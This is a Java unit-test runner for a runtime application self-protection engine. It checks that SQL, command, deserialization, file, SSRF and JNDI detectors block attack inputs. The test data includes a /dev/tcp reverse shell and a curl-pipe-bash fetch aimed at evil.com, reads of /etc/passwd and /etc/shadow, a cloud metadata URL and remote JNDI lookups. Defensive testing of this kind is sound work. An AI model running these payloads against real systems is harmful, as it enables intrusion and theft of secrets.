package com.rasp.detector;

import com.rasp.commons.AttackType;
import com.rasp.commons.Severity;
import com.rasp.core.context.HookEvent;
import com.rasp.core.context.RaspContext;
import com.rasp.core.detector.DetectResult;
import com.rasp.core.hook.HookRegistry;
import com.rasp.detector.sql.SqlDetector;
import com.rasp.detector.command.CommandDetector;
import com.rasp.detector.deserialization.DeserializationDetector;
import com.rasp.detector.file.FileDetector;
import com.rasp.detector.ssrf.SsrfDetector;
import com.rasp.detector.jndi.JndiDetector;

import java.util.*;

/**
 * RASP 检测器单元测试
 * 
 * 测试覆盖所有 6 个检测器，每种攻击类型包含正常用例和攻击用例。
 * 输出格式：PASS/FAIL + 测试名称 + 详细信息
 */
public class DetectorTestRunner {

    private static int passed = 0;
    private static int failed = 0;
    private static List<String> failures = new ArrayList<>();

    public static void main(String[] args) {
        System.out.println("========================================");
        System.out.println("  RASP Detector Unit Tests");
        System.out.println("========================================\n");

        testSqlDetector();
        testCommandDetector();
        testDeserializationDetector();
        testFileDetector();
        testSsrfDetector();
        testJndiDetector();

        System.out.println("\n========================================");
        System.out.println("  RESULTS: " + passed + " passed, " + failed + " failed");
        System.out.println("========================================");

        if (!failures.isEmpty()) {
            System.out.println("\nFailures:");
            for (String f : failures) {
                System.out.println("  " + f);
            }
            System.exit(1);
        }
    }

    // ===== SQL 注入测试 =====
    static void testSqlDetector() {
        System.out.println("--- SQL Injection Detector ---");
        SqlDetector d = new SqlDetector();

        // 正常 SQL
        assertPass(d, "normal select", 
            hookEvent("Statement", "executeQuery", "SELECT * FROM users WHERE id=1"), null);
        
        // UNION SELECT 注入
        assertBlock(d, "union select injection",
            hookEvent("Statement", "executeQuery", "SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3"), null);
        
        // OR 恒等式
        assertBlock(d, "OR 1=1 injection",
            hookEvent("Statement", "executeQuery", "SELECT * FROM users WHERE id='1' OR '1'='1'"), null);
        
        // DROP TABLE
        assertBlock(d, "drop table",
            hookEvent("Statement", "executeUpdate", "DROP TABLE users"), null);
        
        // 注释截断（-- 空格 + 任意内容）
        assertBlock(d, "comment truncation",
            hookEvent("Statement", "executeQuery", "SELECT * FROM users WHERE name='admin' -- AND password='x'"), null);

        // 参数关联：用户输入出现在 SQL 中
        RaspContext ctx = createContext(Collections.singletonMap("username", new String[]{"admin'--"}));
        assertBlock(d, "param taint SQL",
            hookEvent("Statement", "executeQuery", "SELECT * FROM users WHERE username='admin'--' AND password='x'"), ctx);
    }

    // ===== 命令执行测试 =====
    static void testCommandDetector() {
        System.out.println("--- Command Injection Detector ---");
        CommandDetector d = new CommandDetector();

        // 正常命令
        assertPass(d, "normal ping",
            hookEvent("ProcessBuilder", "start", new Object[]{Arrays.asList("ping", "-c", "1", "localhost")}), null);

        // 反弹 Shell
        assertBlock(d, "reverse shell /dev/tcp",
            hookEvent("Runtime", "exec", "bash -i >& /dev/tcp/evil.com/4444 0>&1"), null);

        // curl | bash
        assertBlock(d, "curl pipe bash",
            hookEvent("Runtime", "exec", "curl evil.com/shell.sh | bash"), null);

        // 命令分隔符
        assertBlock(d, "semicolon injection",
            hookEvent("Runtime", "exec", "ping 127.0.0.1;cat /etc/passwd"), null);

        // 参数关联
        RaspContext ctx = createContext(Collections.singletonMap("ip", new String[]{"127.0.0.1;id"}));
        assertBlock(d, "param taint cmd",
            hookEvent("ProcessBuilder", "start", new Object[]{Arrays.asList("ping", "127.0.0.1;id")}), ctx);
    }

    // ===== 反序列化测试 =====
    static void testDeserializationDetector() {
        System.out.println("--- Deserialization Detector ---");
        DeserializationDetector d = new DeserializationDetector();

        // 正常类（如业务 POJO）
        assertPass(d, "normal class",
            hookEvent("ObjectInputStream", "resolveClass", "com.example.User"), null);

        // Commons Collections InvokerTransformer
        assertBlock(d, "InvokerTransformer",
            hookEvent("ObjectInputStream", "resolveClass", "org.apache.commons.collections.functors.InvokerTransformer"), null);

        // ChainedTransformer
        assertBlock(d, "ChainedTransformer",
            hookEvent("ObjectInputStream", "resolveClass", "org.apache.commons.collections.functors.ChainedTransformer"), null);

        // TemplatesImpl
        assertBlock(d, "TemplatesImpl",
            hookEvent("ObjectInputStream", "resolveClass", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"), null);

        // Runtime
        assertBlock(d, "Runtime class",
            hookEvent("ObjectInputStream", "resolveClass", "java.lang.Runtime"), null);
    }

    // ===== 文件操作测试 =====
    static void testFileDetector() {
        System.out.println("--- File Operation Detector ---");
        FileDetector d = new FileDetector();

        // 正常文件
        assertPass(d, "normal file read",
            hookEvent("FileInputStream", "<init>", "/app/data/config.properties"), null);

        // 路径遍历
        assertBlock(d, "path traversal",
            hookEvent("FileInputStream", "<init>", "../../../etc/passwd"), null);

        // 敏感文件
        assertBlock(d, "sensitive file",
            hookEvent("FileInputStream", "<init>", "/etc/passwd"), null);

        // WebShell 写入
        assertBlock(d, "jsp webshell write",
            hookEvent("FileOutputStream", "<init>", "/var/www/shell.jsp"), null);

        // 参数关联
        RaspContext ctx = createContext(Collections.singletonMap("path", new String[]{"../../../etc/shadow"}));
        assertBlock(d, "param taint file",
            hookEvent("FileInputStream", "<init>", "../../../etc/shadow"), ctx);
    }

    // ===== SSRF 测试 =====
    static void testSsrfDetector() {
        System.out.println("--- SSRF Detector ---");
        SsrfDetector d = new SsrfDetector();

        // 正常 HTTP
        assertPass(d, "normal http",
            hookEvent("URL", "openConnection", "https://api.example.com/data"), null);

        // file:// 协议
        assertBlock(d, "file protocol",
            hookEvent("URL", "openConnection", "file:///etc/passwd"), null);

        // 内网 IP
        assertBlock(d, "internal 192.168",
            hookEvent("URL", "openConnection", "http://192.168.1.1/admin"), null);

        // 云 metadata
        assertBlock(d, "cloud metadata",
            hookEvent("URL", "openConnection", "http://169.254.169.254/latest/meta-data/"), null);
    }

    // ===== JNDI 注入测试 =====
    static void testJndiDetector() {
        System.out.println("--- JNDI Injection Detector ---");
        JndiDetector d = new JndiDetector();

        // 正常 JNDI (java:comp)
        assertPass(d, "normal java:comp",
            hookEvent("InitialContext", "lookup", "java:comp/env/jdbc/MyDB"), null);

        // LDAP 远程
        assertBlock(d, "ldap remote",
            hookEvent("InitialContext", "lookup", "ldap://evil.com:1389/Exploit"), null);

        // RMI 远程
        assertBlock(d, "rmi remote",
            hookEvent("InitialContext", "lookup", "rmi://evil.com:1099/Exploit"), null);

        // DNS
        assertBlock(d, "dns jndi",
            hookEvent("InitialContext", "lookup", "dns://evil.com/Exploit"), null);

        // 带 URL 的任意协议
        assertBlock(d, "custom protocol",
            hookEvent("InitialContext", "lookup", "evil://attacker.com/payload"), null);
    }

    // ===== 辅助方法 =====

    static HookEvent hookEvent(String className, String methodName, Object arg) {
        return hookEvent(className, methodName, new Object[]{arg});
    }

    static HookEvent hookEvent(String className, String methodName, Object[] args) {
        return new HookEvent(className, methodName, null, args, null);
    }

    static RaspContext createContext(Map<String, String[]> params) {
        RaspContext ctx = RaspContext.create();
        ctx.setParameters(params);
        ctx.setRequestUri("/test");
        ctx.setRemoteAddr("127.0.0.1");
        return ctx;
    }

    static void assertPass(AbstractDetector d, String testName, HookEvent event, RaspContext ctx) {
        DetectResult r = d.detect(event, ctx);
        if (r == null || r.isPass()) {
            passed++;
            System.out.println("  [PASS] " + testName);
        } else {
            failed++;
            String msg = testName + ": expected PASS but got " + r;
            failures.add(msg);
            System.out.println("  [FAIL] " + msg);
        }
    }

    static void assertBlock(AbstractDetector d, String testName, HookEvent event, RaspContext ctx) {
        DetectResult r = d.detect(event, ctx);
        if (r != null && r.isBlock()) {
            passed++;
            System.out.println("  [PASS] " + testName + " -> " + r.getMessage());
        } else {
            failed++;
            String msg = testName + ": expected BLOCK but got " + (r != null ? r.getAction() : "null");
            failures.add(msg);
            System.out.println("  [FAIL] " + msg);
        }
    }
}
